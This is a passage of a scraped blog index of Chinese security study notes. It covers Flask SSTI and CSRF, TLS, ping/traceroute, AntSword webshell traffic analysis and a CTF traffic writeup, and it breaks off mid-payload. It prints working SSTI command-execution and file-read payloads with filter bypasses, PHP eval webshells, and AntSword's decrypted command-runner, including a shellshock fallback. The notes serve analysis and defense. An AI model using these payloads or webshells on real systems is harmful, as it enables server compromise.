“targe.jpg”:”hidden.jpg”","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"misc","slug":"misc","permalink":"https://polosec.github.io/tags/misc/"}]},{"title":"flask&ssti&csrf","slug":"flask-ssti-csrf","date":"2020-05-14T04:42:38.000Z","updated":"2020-05-14T14:00:00.000Z","comments":true,"path":"2020/05/14/flask-ssti-csrf/","link":"","permalink":"https://polosec.github.io/2020/05/14/flask-ssti-csrf/","excerpt":"","text":"最近”闲的”没事研究了一下flask框架的防护问题，主要是ssti与csrf。10号前一直在搞用flask写的bms，算是荒废掉了。。先说一句废话，七牛CDN有个测试域名，一段时间后失效，失效后需要替换为自己备案后的域名进行CDN加速，在这里出现了一个问题，在hexo主题配置文件将URL换为自己的CDN域名后，用之前的域名上传的图片就找不到了（因为之前的域名已经被废弃，无法解析）这时候可以 hexo clean 然后 hexo g，重新把md文件渲染成html文件，这样里面产生的图片链接的URL前缀就是我们新配置的CDN域名。 参考资料https://mp.weixin.qq.com/s/Lj4nCz0hag-AKQF_s79fQwhttps://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%A6%82%E8%BF%B0https://xz.aliyun.com/t/6885http://shaobaobaoer.cn/archives/660/python-flask-jinja-sstihttps://www.anquanke.com/post/id/188172 SSTIssti就是服务器端模板注入（Server Side Template Injection）模板指的是现成写好的东西，只需要传入一些变量到模板，然后渲染成html页面。模板是写好的，而变量是每次需要传入的。不正确地使用模板引擎进行渲染时，会出现SSTI漏洞。（jinja2）在flask中，使用jinja2模板渲染引擎，有两种渲染模板的方法：render_template()和render_template_string()，两种方法的区别是第一种指定一个模板文件(.html)，第二种则规定了需要传入一个字符串，把html代码写到字符串中。出现问题的是第二种渲染方式（我写bms的时候用的是第一种。。本来想写写防御来着，但是根本不存在利用点），当显示方式为直接获取变量时，如 12person[&#x27;name&#x27;]=request.args.get(&#x27;name&#x27;)hello ,&#123;&#123;person.name&#125;&#125; 这样的话传入 1?name&#x3D;&#123;&#123;7*7&#125;&#125; 的话显示的就是7*7，因为这样会把传入的内容当作字符串进行处理，而非模板语句。如果是这样： 12person[&#39;name&#39;]&#x3D;request.args.get(&#39;name&#39;)hello ,%s %person[&#39;name&#39;] 通过字符串格式化的方式传入内容，模板语句会被解释执行。 SSTI利用任何漏洞的目的是实现个人意图，比如getshell，读取文件。对于SSTI的利用，我遇到的主要是通过获得config里面的secret key进行伪造session，模拟管理员登录；或者通过实例化os反弹shell，或者通过file、open对象进行文件读取。__class__获取当前实例的对象，__mro__获得父类链，__subclasses__获得当前类所有的子类，__init__实例化一个类，__globals__获取所有可用的方法与变量。举例：命令执行： 1&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&quot;os&quot;][&quot;popen&quot;](&quot;whoami&quot;).read()&#125;&#125; 过滤与绕过过滤引号request.args是Flask中的一个属性，为返回请求的参数，这里把path当作变量名，将后面的路径传值进来，进而绕过了引号的过滤： 1?name&#x3D;&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125;&#125;&amp;path&#x3D;&#x2F;tmp&#x2F;cmd.py 过滤双下划线1?name&#x3D;&#123;&#123;&#39;&#39;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;&amp;class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__ 过滤中括号首先明白中括号是什么作用：从字典中取值。 1globals[&quot;os&quot;]&#x3D;&#x3D;globals.os 所以可以用__getitem__绕过。 过滤点号1&quot;&quot;.__class__等价于&quot;&quot;[&quot;__class__&quot;] 关键词过滤思路是进行拼接。 1&#123;&#123;&quot;&quot;.__getattribute__(&quot;__cla&quot;+&quot;ss__&quot;)&#125;&#125; SSTI防御首先是尽量不使用render_template_string(),如果用的话，尽量不使用格式化字符串的形式；如果必须使用的话，要建立相对强的过滤规则，尤其是对小括号的过滤，过滤小括号后就很难执行命令了。对于关键词过滤，我的思路是进行预处理，将接收到的字符串中的引号，加号等特殊符号正则匹配去掉后再进行黑名单匹配。 flask csrf分析开口就是老csrf了，先分析分析源码首先 1CSRFProtect(app) ，跟进CSRFProtect 然后有一个app.before_request修饰的方法，说明在请求前执行。 该方法进行 1self.protect() 跟进self.protect() 使用方法validate_csrf尝试验证token的正确性，token为self._get_csrf_token 其实对URLSafeTimedSerializer这个我不是太熟悉，我对他的理解是产生一个session，session包括三个字段，base64加密的数据字段，timestamp，签名。然后产生的token就是获取序列化后的session的数据字段的 1session[field_name] 中的数据。 生命流程第一次访问，产生session与token，设置过期时间第二次包括以后的访问在头部或者表单中携带token，访问前进行验证，验证通过则允许访问。除了token外还有请求头，同源策略等验证 CSRF防护就flask的csrf防护方法而言，主要是防止hacker拿到token，主要需要防范xss，比如上述提到的ssti会导致xss。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"SSL&TLS","slug":"SSL-TLS","date":"2020-05-01T10:27:41.000Z","updated":"2020-05-01T11:08:45.000Z","comments":true,"path":"2020/05/01/SSL-TLS/","link":"","permalink":"https://polosec.github.io/2020/05/01/SSL-TLS/","excerpt":"","text":"最近复习计算机网络看到了计算机网络安全那一章，对SSL TLS 证书等内容有了初步理解，这里做一个记录。参考链接：http://www.ruanyifeng.com/blog/2014/09/illustration-ssl.htmlhttps://segmentfault.com/a/1190000002554673https://kb.cnblogs.com/page/197396/https://www.cnblogs.com/handsomeBoys/p/6556336.html 证书CA是证书授权中心，简单说就是签发证书的机构。证书签发流程：服务端向CA提交公钥，组织信息，域名等内容CA审核通过后签发证书，证书包括了：申请者公钥，申请者信息、域名、有效时间、序列号等内容，还有一个数字签名：CA用CA自己的私钥对申请者所有信息生成的摘要进行加密。简单来说，证书=申请者公钥+CA签名+申请者信息 https请求过程1.客户端向服务器443端口发送请求2.服务器返回证书3.客户端验证证书有效性，并且产生一随机值，通过服务器公钥加密。4.服务器收到加密后的随机值后，用私钥解密，接下来双方传输的内容都用该随机值加密。 SSL/TLS通信过程：1.客户端给服务器发送请求，声明自己的加密方式，并且发送一个随机数2.服务器返回证书，确定使用的加密方式，发送一个随机数3.客户端验证证书有效性，验证通过后，产生一个随机数，通过服务器公钥进行加密，作为premaster key发送给服务器。4.服务器接受到加密后的随机数后解密5.客户端与服务器根据相同的算法，通过两个未加密的随机数与第三个随机数产生session key6.服务器使用session key发送一个数据，验证连接是否成功建立。7.以后客户端和服务器的通讯使用session key加密（对称加密）","categories":[],"tags":[{"name":"网络","slug":"网络","permalink":"https://polosec.github.io/tags/%E7%BD%91%E7%BB%9C/"}]},{"title":"ping&tracert","slug":"ICMP-tracert","date":"2020-05-01T10:14:22.000Z","updated":"2020-05-01T10:35:50.000Z","comments":true,"path":"2020/05/01/ICMP-tracert/","link":"","permalink":"https://polosec.github.io/2020/05/01/ICMP-tracert/","excerpt":"","text":"pingping命令用的是ICMP回送请求与回答，如果ping一个存在的主机的话，在不禁止ping的前提下会发一个ICMP回送回答，主机计算RTT，平均RTT与TTL。 tracert/traceroute利用的是ping命令，把ttl从1往上加，当路由器收到ttl为1的数据包后-1变成0，会给源站发一个超时，但是存在的问题是如果该路由器对超时不处理的话，在源站看到的节点就变成了*，也有可能是某些路由器对tracert命令不可见。","categories":[],"tags":[{"name":"网络","slug":"网络","permalink":"https://polosec.github.io/tags/%E7%BD%91%E7%BB%9C/"}]},{"title":"蚁剑流量分析&webshell","slug":"蚁剑流量分析-webshell","date":"2020-04-30T02:53:51.000Z","updated":"2020-04-30T08:29:13.000Z","comments":true,"path":"2020/04/30/蚁剑流量分析-webshell/","link":"","permalink":"https://polosec.github.io/2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/","excerpt":"","text":"webshell理解webshell的本质是传入命令并且执行。常见的php webshell 1&lt;?php eval($_POST[&#x27;cmd&#x27;];?&gt;) shell.php访问shell.php的时候post一个参数cmd,如果传入的是cmd=system(“whoami”)的话就会执行whoami。webshell相当于网站管理功能，提供列目录，修改文件，虚拟终端等操作，这些可视化操作的背后其实是一条条PHP语句写的，然后送到服务器执行，然后根据返回结果可视化到管理终端。shell与waf一直在升级，衍生出了各种混淆方法。当然，waf也在抓特征流量进行拦截。 蚁剑流量分析今天分析的是昨天没看完的蚁剑流量。发送数据采用RSA加密，服务器返回数据采用AES加密。shell： 12345678910111213141516171819&lt;?php$cmd = @$_POST[&#x27;ant&#x27;];$pk = &lt;&lt;&lt;EOF-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCd3U6xkZFNwFKSRlRa+Jsdy0/Erkpoq9A/Xl58TfOL5ghxaQh91zWriwpsMVMdjkORzTNM0yrKoyF2+LjxzE2wW6Qt/NC6dQgUKQQJk9ypgq4Po9ypxxI8AdtthKSelijpqD5YsXZYSFGCyLNaC33+pVp2wQUED9OTJg9AuXIG4QIDAQAB-----END PUBLIC KEY-----EOF;$cmds = explode(&quot;|&quot;, $cmd);$pk = openssl_pkey_get_public($pk);$cmd = &#x27;&#x27;;foreach ($cmds as $value) &#123; if (openssl_public_decrypt(base64_decode($value), $de, $pk)) &#123; $cmd .= $de; &#125;&#125;eval($cmd); 首先模拟一次过程：启动虚拟终端并输入whoami查询。 在wireshark抓到数据包： 追踪HTTP流量： 对发送的数据进行还原使用私钥加密的数据用公钥解密。解密后数据： 1234567891011121314151617181920212223242526272829&lt;?php ant=@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);function asenc($out)&#123;@session_start();$key=@substr(str_pad(session_id(),16,&#x27;a&#x27;),0,16);return @base64_encode(openssl_encrypt(base64_encode($out), &#x27;AES-128-ECB&#x27;, $key, OPENSSL_RAW_DATA));&#125;;//采用AES加密输出，key为session前16位。function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;3c5e3e9640&quot;;echo @asenc($output);echo &quot;cda10a9ad&quot;;&#125;//输出内容ob_start();try&#123;$p=base64_decode($_POST[&quot;kba6818a1ddd35&quot;]);$s=base64_decode($_POST[&quot;med28329bbe5b9&quot;]);$envstr=@base64_decode($_POST[&quot;v610da0caba97e&quot;]);$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);//获取下面post的参数，分别是cmd和whoami。$c=substr($d,0,1)==&quot;/&quot;?&quot;-c \\&quot;&#123;$s&#125;\\&quot;&quot;:&quot;/c \\&quot;&#123;$s&#125;\\&quot;&quot;;if(substr($d,0,1)==&quot;/&quot;)&#123;@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;);&#125;else&#123;@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;);&#125;if(!empty($envstr))&#123;$envarr=explode(&quot;|||asline|||&quot;, $envstr);foreach($envarr as $v) &#123;if (!empty($v)) &#123;@putenv(str_replace(&quot;|||askey|||&quot;, &quot;=&quot;, $v));&#125;&#125;&#125;//判断是Linux还是Windows$r=&quot;&#123;$p&#125; &#123;$c&#125;&quot;;//拼接命令function fe($f)&#123;$d=explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));if(empty($d))&#123;$d=array();&#125;else&#123;$d=array_map(&#x27;trim&#x27;,array_map(&#x27;strtolower&#x27;,$d));&#125;return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));&#125;;function runshellshock($d, $c) &#123;if (substr($d, 0, 1) == &quot;/&quot; &amp;&amp; fe(&#x27;putenv&#x27;) &amp;&amp; (fe(&#x27;error_log&#x27;) || fe(&#x27;mail&#x27;))) &#123;if (strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;) != FALSE) &#123;$tmp = tempnam(sys_get_temp_dir(), &#x27;as&#x27;);putenv(&quot;PHP_LOL=() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;);if (fe(&#x27;error_log&#x27;)) &#123;error_log(&quot;a&quot;, 1);&#125; else &#123;mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);&#125;&#125; else &#123;return False;&#125;$output = @file_get_contents($tmp);@unlink($tmp);if ($output != &quot;&quot;) &#123;print($output);return True;&#125;&#125;return False;&#125;;function runcmd($c)&#123;$ret=0;$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if(fe(&#x27;system&#x27;))&#123;@system($c,$ret);&#125;elseif(fe(&#x27;passthru&#x27;))&#123;@passthru($c,$ret);&#125;elseif(fe(&#x27;shell_exec&#x27;))&#123;print(@shell_exec($c));&#125;elseif(fe(&#x27;exec&#x27;))&#123;@exec($c,$o,$ret);print(join(&quot;&quot;,$o));&#125;elseif(fe(&#x27;popen&#x27;))&#123;$fp=@popen($c,&#x27;r&#x27;);while(!@feof($fp))&#123;print(@fgets($fp,2048));&#125;@pclose($fp);&#125;elseif(fe(&#x27;proc_open&#x27;))&#123;$p = @proc_open($c, array(1 =&gt; array(&#x27;pipe&#x27;, &#x27;w&#x27;), 2 =&gt; array(&#x27;pipe&#x27;, &#x27;w&#x27;)), $io);while(!@feof($io[1]))&#123;print(@fgets($io[1],2048));&#125;while(!@feof($io[2]))&#123;print(@fgets($io[2],2048));&#125;@fclose($io[1]);@fclose($io[2]);@proc_close($p);&#125;elseif(fe(&#x27;antsystem&#x27;))&#123;@antsystem($c);&#125;elseif(runshellshock($d, $c)) &#123;return $ret;&#125;elseif(substr($d,0,1)!=&quot;/&quot; &amp;&amp; @class_exists(&quot;COM&quot;))&#123;$w=new COM(&#x27;WScript.shell&#x27;);$e=$w-&gt;exec($c);$so=$e-&gt;StdOut();$ret.=$so-&gt;ReadAll();$se=$e-&gt;StdErr();$ret.=$se-&gt;ReadAll();print($ret);&#125;else&#123;$ret = 127;&#125;return $ret;&#125;;//命令执行函数$ret=@runcmd($r.&quot; 2&gt;&amp;1&quot;);//命令执行并且stderr重定向到stdoutprint ($ret!=0)?&quot;ret=&#123;$ret&#125;&quot;:&quot;&quot;;;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();//执行入口die();//这里是post的数据，对应上面的med28329bbe5b9和kba6818a1ddd35。。。&amp;kba6818a1ddd35=Y21k&amp;med28329bbe5b9=Y2QgL2QgIkU6XFxwaHBzdHVkeV9wcm9cXFdXV1xcdGVzdC5pbyImd2hvYW1pJmVjaG8gW1NdJmNkJmVjaG8gW0Vd&amp;v610da0caba97e=?&gt; 具体的操作写在上方注释里了，比较清楚。 实战接下来启动虚拟终端，传入whoami ，并且执行，查看数据包。 返回数据解密客户端收到数据后会用约定的key进行解密。返回数据：注意：返回的数据里面并不全是有效加密内容，前后存在两端干扰数据，可以在 代码中看到分别是3c5e3e9640和cda10a9ad。中间的数据才是真正有用的数据。首先对中间的数据base64解密一次，然后使用AES-128-ECB解密。key为session前16位：substr(sessionid,0,16);。解密方法：openssl_decrypt($payload, ‘AES-128-ECB’, $key,OPENSSL_RAW_DATA)解密后数据：ZGVza3RvcC00dTgxYjg1XDY5MDI3DQpbU10NCkU6XHBocHN0dWR5X3Byb1xXV1dcdGVzdC5pbw0KW0VdIA0K然后进行base64解密。解密后的数据：desktop-4u81b85\\69027[S]E:\\phpstudy_pro\\WWW\\test.io[E]就是执行whoami的结果。 总结蚁剑流量分析算是看了一天，得益于前期对AES和RSA的基础知识，以至于不需要先看RSA和aes。。2333在对shell和发送的代码进行分析的时候还是遇到了一点困难，有些地方只是大体明白了什么意思，比如识别是Linux还是Windows，但是细讲每一个函数的功能我还是不知道的。对此我的思路是既然目标是命令执行，那么就把底层的实现稍微抽象一点，不影响后续分析。分析流量还是一件非常有意思的事情，虽然我没有机会打AWD，but I love AWD forever!!!!!!!","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"安恒月赛流量分析","slug":"安恒月赛流量分析","date":"2020-04-28T14:36:49.000Z","updated":"2020-04-30T07:37:18.000Z","comments":true,"path":"2020/04/28/安恒月赛流量分析/","link":"","permalink":"https://polosec.github.io/2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","excerpt":"","text":"经过一下午的奋战，弄明白了awdshell这道题，下面说一下思路参考链接：https://xz.aliyun.com/t/6701https://mp.weixin.qq.com/s?__biz=MzI0MDI5MTQ3OQ==&amp;mid=2247483852&amp;idx=1&amp;sn=3cd3f667523550d414fad97231eeeaea&amp;chksm=e91c5a34de6bd3223f5c3e69aa12311be39d4c13ee8d222ddb81f97070c74698dc7ae7fcecba&amp;mpshare=1&amp;scene=23&amp;srcid&amp;sharer_sharetime=1572778022447&amp;sharer_shareid=3bdf1b0c76d4c1691e700c57f87d9c0a%23rd用到的知识：PHP OPENSSL，wireshark抓本地包（npcap），AES，wireshark流量分析、过滤语法、蚁剑RSA 解题过程导出HTTP对象首先常规操作就是导出http对象，发现有个upload.php，发现传了个不认识的马，写了公钥，考虑RSA加密。 可以确定，传了个马，思路的重点应该向与马的交互上考虑。 流量分析通过过滤数据包，确定了上传后的文件命名为1581335771.php，于是在数据包中重点观察与该文件的交互。使用过滤器，语法：http and ip.dst==139.224.112.182 and http.request.method==POST 按个追踪HTTP数据流看看呗，看看有啥有用的信息没。追踪29543包的时候，发现了字符串L3Zhci93d3cvaHRtbC9hZG1pbi91cGxvYWQv，可能是base64，解一下发现是/var/www/html/admin/upload/，应该是文件的上传路径。剩下的HTTP流挨个追踪，返回的数据都是加密后的，返回数据暂时没有什么有用的。于是继续注意发送的数据。在追踪倒数第二个HTTP流的时候，发现了一些蛛丝马迹。发送的数据那有Y2QgIi92YXIvd3d3L2h0bWwvYWRtaW4vdXBsb2FkIjtjYXQgZmxhZztlY2hvIFtTXTtwd2Q7ZWNobyBbRV0=，经解密后发现是cd “/var/www/html/admin/upload”;cat flag;echo [S];pwd;echo [E]，这里可能藏了flag。所以应该对该数据包发送的数据进行还原。 流量还原由于导出HTP对象的时候有个公钥，考虑非对称加密（RSA），结合题目给的关键字ant与给出的shell的格式，可以确定这是用蚁剑连的shell，并且发送数据经过了RSA加密。可以写个脚本把发送的数据还原出来。 1234567891011121314151617181920&lt;?php$ant=&quot;GmFJzJHcsMOZxeGvb3Ulf4Y8e5RRhttAV1bsfypbvQAJW8IRFcqDVoXtyiclZwz2qXdQN8ivFYNqNxhkwtjbB7OitVLgULBfWlOnwtufxvmbmO4u8WlINbPbf/DbAy0Qx3GjBMFpFzrCkKINOfWQ5JqSD1EPx6sM9Cu1VkX5nus=|nL6Ds9dWn+UW5Jb0JAhoTb4rqPJJKbgcPNJfXLP1AKPbWHVE0JFSjClsnXWmFPXfeqPdKqcYxb/14hEwFzs51N5f6+NowrGHjYT+ObPKXpYxzg0vkCMihUMA7DI2YPUWEyPdvoIFg/bW5S3MommwKN9epOto55dtq6Pnb8NEHzY=|S4ic8EaKa3zEkRd7qsTGDs7uf3qiU1UVZE4fheQz3iq1HkiY6rIvAdtvcmsBF5aJWjdA/U2py1Mz105F2Tzm4dDX2Ag/rhX4ysiP8NJDEp+I55R0dfJu6szTOr3O2OTaUQK7iSYT4PKHjdo+rgeHK3hWzzMFAs6i2R9E81vz9WE=|FNCwxF7bDPNgizk4oa7bq4xbIObNCZNYNBdrTLMbYegWZ6FVYi54TLuABR/nkDLXq38cT099hjajM4iY+VL4g8tBRP++4LyPcSyzyC6mDtshAlmQtFteq4sGb+3IilDPekURxQ5RodRGBPtHr+nCNICbgmbqNaYKcVJRfMoK3q8=|m+nGWL1bOFJzaYeT54FtW12U3dWPZk5PJa91+YTtLn9Wg1c8JEf0FzI+YlBtpp6pW0fT7FfbTiJhQsv3f97bb3d+Cs7A5dM/ZG5YXDoDHGhRJKw0+TTHRIm3PH4fnbQNI8zhi5+9t2+0ueujAuXkk8i73A4lH36uKJFloL6yqs8=|YsyuPkbRlpDWwjhlkTThQN9GQXGkkzyNSFoxs5IfsRbbO7ZHphlFhL4yYsRYAgp8MkMJ64x7NfIGoVgDJnA1YgORiJOf8GP/p/28MLOuscy1SVN/lLnJzbhmf/7vfg0/Q94QAEWk2TOgSil0h3JDsgQYqDtFFldHWDnqEvYlWZI=|C2ZaL3MQWCQBmNcq8xAxxlhvXzUxo0qBz2PUIqBIMcKNJ3sgxU+RTqSwYoqPTDAg3//7rNa+dkinRAidD8GjrcSBd5qdbTLQlWZGME9Lv6JEFt0udTU0FVrhV/ctPz+z1NN5P4pN1tj35sNKsyfYH1kq13A+3dYk0wZlMU9KIFI=|l65yWzb3A97Cdu0wdn59Hiag/Um4/LZTrolCjwo9d7/J3Z9stTkaEtLe2XBdVQZsipUfnW2o7JWgQNo0TUbGWIv2H5wKGaTfPm7OTSkm+ao48Nn1d/+yME+RLudQqbmYREMAJFviNJST+H4Q+MqyngjMeGrb5jmlw0eQZ/MUx5Q=|EYwu5Y3rgl8k2KrPZjnGPWjriLI1mDeJwA4KhjvJ4wQs9Xx+ITDsxBr0eMfL/Km95ykbfMlZcrSzonx5hLiE2YLwDjX/cIIZxqzZXkEYq00AdAPrFnhFVdvJn/SHQ1LdGHgAN88Y2EOZOPM8ZXima61BxCY44TlrezIbBj4+eQ0=|Z2/dEUju0jw63PMHCK9CAG+tHmwiH0t3GraGPCes4TZT5hIfv6kHMTOgMthTK6sd5qy+EVw6d1Qxh03WMHVH0gR2aYqEl1RdYwQpN0NPsSM+fETsag3nQ4oV3VniGlaMmdFIiYatNvKNl7tOcapklyxEEIA0Jc33O7FDjUXKiHU=|YEVG5OctKJXP1Z7kywDJGrmb7BvXW/C3iQudtTCLgUIbMhXFq90wLvW7No7ZoqhY/Mh1XlJKtkBZJWEbsORW23hxvA5LCb/edsfJmIxWtj5cRG9g66j3BiEUPDjvtYi6beUjUtKmuSInELTkmIKf1jo5qyZE+VcWC4HfAT0wbFw=|ii/O42J/+ko4xPNfNuunKR7gyji/wtaiMcKMzQM2Qg7KZE/+xAcLX3Znh55OwgsfaTX6AedF+L/1hwMp9zigbvXorSE0TNay//nVlcnhhC4snAu2/hjXNoI3OnnWlfFFLYOj5v+1LN1nCU/UzoHV6/w1/4bVz7Maovj14BfXklI=|eay1qqOy5QmJmStB9EH4JKPms1In5agVigegn5/1IZS+0QpBgK37mWg02rspbMz20brtSgsv2PhJ3gMTFg3ib7z0cQZPvcNV6DTZwSHbUO2M1uQetssYMMnBPPulwLhTkND4SzwSsgDLS6m8TxbHL0qpZRcnNo2sMy478S5DkvM=|e4qLRtta2W6ItXy3HNgpYuQuSSzpsvq+SUfoRKWM8Z5QdiBeleS/YDGP0VZqRJh3CPMC6vbegwB7qNLAt6czTsHQTdTAJBLr5g4oTDc9Sxlk8A7vvK0ljLSgKjNw5s3BDa03jINPkc5BbDkrTaXMq01Bqcu5DPTTA0pO/Z9oq1Q=|RBdZrEGknOK+PCuQ1F2eTxKvAi50XD/Z1ccAItPJ+48VlSbOTZa/wkdr82K8LE56z0E4JtZDBVSj9I4TurU2bbmfCjKXGw9xlagS7YMr/hfyCy/2hrVveAkaBZDAtmnrM4nGpFxVpzArl124XlqEzh9cSS9LAnwkNm8j05D6mDc=|aZpV5K4m1Rwxd/Y9eOfJ0bRpIZybj2tSjuAEJI7Il/EV9ZC0pXLIkgWviG40pXQFGoEwGex7f0j/Je4ldLRKnrpsyZ+/3mZtHnHL4gepf+iVaULQ8jdHTVVnM1t4qLJk+RnhYbuFjcUy5Yo6rn0Cju8sPIdpEwvi8fvetIOGVJE=|fPGROe6VaAwzqmNuk86fnWT4LqandXTwuewTC80zI8xTFSj1S6YMxPROTHS94gXlCcLTfFjEW2VpH2tyANX1FBIw5sSjsuS6CQKuqiQo6ID975H5Ox+KkJs6XLP/l5Or34U3rryHzBooTrXQlDl21qoPBLdj5URgGrEq7wrvLVA=|jp3lUm3Gz2eZpB5zghEGom2syK8nBymkc6h3pKE/mIS8KW6gD2OFSEneFERI0jy26kVOBhxr3ZHY3WoL6s5aJepTuY7D6Dpz/REI+FzR2PlCo0WvyLQdOphMgbYef1SyYr1+DWK/JxxFjxtfVRZlwL7+OyHQjQ05oVHyq6juSEI=|h8tsCCKgjChZ5U/sZxeVPiF8hO+cB6qqfeWnTAMydEcLmR0iwvHcarZw4g2WH2ASvwIN0av4GzLSu2QtOM1u0y/OuVX3v9/Vp+nNMZ/Dog0NUxFIPD1HTgaK3w7DdnA6B6i26JooWAxKlTFgYmr0x7K53pmM6B8wVQu/ADsbFBE=|CdejrTSVZhSgL+3bhPQyuL7ho71i+L8VvpwNg+D84YnKdwbbbfgqIMu+gefCBmyzvhbhEeGR16/T/fZ4bkneak+fzZpgUrejrFbOETG2Rg9zViznPwBdku9FTlWUybaRD0CHKeY7nE93/G2yXWSpuk/7P594cAPi1qd2WnEbaBc=|Hnxjy7ZSfmn6B59Kv7VXu1mhtYdgGbOtsLsLqDX6K1dKhtHsGx0guy03qwqRA0XElDdJ3Dvgqi5lgb8SY6MiDf1c9u870K8S9xVTn6Y0lbZgtvPoDrobEiT6tGEQCRsUuXB6jbUTgnNPmaDAuidQZqdsSBIGZwQyzycgxHmaDuE=|Imz1om4RRCU1Wnyowe5SYFtICyD1BODveyZ497yURKcyMgoogUxi0cPCiyexdD9ciNYk6DGyimegT7zMeIA5oGfNg2EHbzuBJeSc4wqLCJtSmTe66inu3dqC4IDxt2ghkgFLSQZWqNOKOgUt1b5wgy3O/Y3iIzS888TuFSDm+RQ=|jldlrb8EHvWiKi5E/HBIrn4UUnzMZO8+6ugZ7hjZTtWI5Vg9EeWdmITpEpOQIWIXpOUhaI+VydVcom8e7Fe6gR6u4RPy5ChmFgjZhT03gwwNXzJeiaE6x7ZZjXGBZA3Lwu5gRns3s+hTM0Tm2vrhGOQDB41hDDi4N/Yb3MRn0PM=|UJKgd4FCzzzMeQEq+w3S17+3d+g9mM3JM2qZWkWHOIF3L/EiWpRhm18DuaWJ7veqQSA5pb3KGH9rKDvj2KHIDTUHl0gCiH1U5qeD+WqXFvLahN5O8ecrfgflUUip1SdE6aL6dYqzyplxF+qy3BVr2dKq+6UYlUiA5Bmn2lXSIyM=|LClEAJBfCO7HMhlu0ASDbetkR7sP4aOx9a/P4P0L5kLeGYrlrK4Qg3ZNl7Fd/gQ8KXAKs90XRE62pfZidMX1A4xj/IokC6nkXCNUIzi0PWPWdCzcBNiswbQtsTZhElecl8RyfaOSvxsiKclTvKbZYfQI5r0p0asBs5gKnK0FpT4=|paMu+DWwNp+5GRSiGn4QfFaS/ffXXKuBgP/qzsixnnBWMeXIVy/HT23Xdoc7/OdlIH8/rBKdrJt+7o6XUAbRGzND9sEuf0Ldh5npWln/EhSkGq+bqt1hDfmwwsoo2GJcNDHBhz6lQq2M4zoa9E9d04T3N/SE+3B7LFb0cxLE8aA=|Cz+hQca9uYZJPPJusvE1G8X12VF5iPFM83nOnszF38XQziVKd+D83N4IvoJPNdJLEtgbycIpg1bo5auK1u9n2Pv8z1jFHoaTzmPgDBFiAAv3NGd0m2vg09QwRxq84PD9Ey0dwT7C1w2e6M9wGJ6DoIhPhZQgvUKMyrmCAVmMo18=|h59BqEgdFq4a1HegvdVKeMWwiwQMQsaSzYOxbNCiPuCRGknF8dHHkQboB65gnjbNBDPVpiVoDBMDV+1sCc1yM8zqC494bDS7iopf/U3BBnZS2wCxeo1x78DUiEgzP6ILomxrhrMY2y5R9IbmhJQVkpiqMhPaCvvHzOZO6Pz9SHg=|gUSFO4uVnPAI4UVTKCdBqH/rD6BZZFPfhsVOzga0ohjOJhXW+pvAu4GSh+3FIGn6cpxBUILbsLjBSgmscqAbKV/nHRnQ8HjQUgnu5YM8KikKJV35OMt1Mo1P/qlF5bwzI969XDtUHtClPkznXuO4HyvGLj0/mJj0IauhxfDKhyU=|jkhijGHqR86l+YGh7fldHrzLfam9LUYfRt2nrqqgeqCoE6KO8khatGkzLPk8QgIjLti6P6d7AwwPdVLX3gsfv6bBhT26qUR1u5+AA8foNt5tH6Ej33OODcnkxcp19eFu+zWRG1zUDkBs5qtCJvZKnpSPFKxJ6Z2g0RAoKF3pqbY=|QayQ2dVrEz8KBgpVQjGRNbpRHgFhVK3e89fEzEKzlclezrZ7CBgjB6/Y0PPYSIeZldFEZficAzHXs+bFHALEMrkJlRMk36FMuqtn0YVs4cVy8AHxjb8QnJD9gsFC6q2EWmRo8w4ZdBvg1xyeg3D0vhOcZgNk78BGoSU2HhHK5xY=|Ncgk0CAlnik6xDFINohB1EqgT7tS8COpia8O9cuvi53lNlQWY4IWG2oZMgzNWeU/m8QL+EGqhrD6IflJDD/hDO/IFC6D2DEjeMofqJ/6sHXAt2lIV129SeUUjGdrxyxeWDtqu6iBDdDBtyfPVfeI/DMYOh46XkR0Wk5nBU2N7+U=|lOxi5A2Z8sa8+aw5rQm0g6gqukXMlwvLV7ykEiGWFRqFqDaRPnkVI8diKsvgBg0Btk94gXt2FX1polSNgIJL3E6GW9loo2OMSGBBg1KJ/6VC/DpLWy44VbZhrUB//hiXo3xua6h2DRDi4h5eFkkf2ZIjGjZBi+AqHQINUbetN54=|DRBn6EF3Eoj+wpOX2xhKhkrypPB+d2+8PyHzXwKL8QmOeaRufeCZ1/7Id4TQPXiRXOYsPDXVLr1tUWAUNfqIQisGxSL8lAgg9LzYNYxRUe